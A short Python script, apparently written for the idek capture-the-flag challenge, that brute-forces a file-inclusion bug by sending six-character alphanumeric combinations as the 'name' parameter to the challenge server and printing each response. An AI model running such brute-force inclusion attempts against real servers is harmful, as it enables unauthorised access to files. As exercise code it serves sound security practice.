import itertools
import requests
import sys
import string


print('[+] Bruteforcing the inclusion')
for fname_tuple in itertools.combinations(string.ascii_letters + string.digits, 6):
    fname = ''.join(fname_tuple)
    url = 'http://idek-hello.chal.idek.team:1337?name=' + fname
    r = requests.get(url)
    print(r.text)

print('[x] Something went wrong, please try again')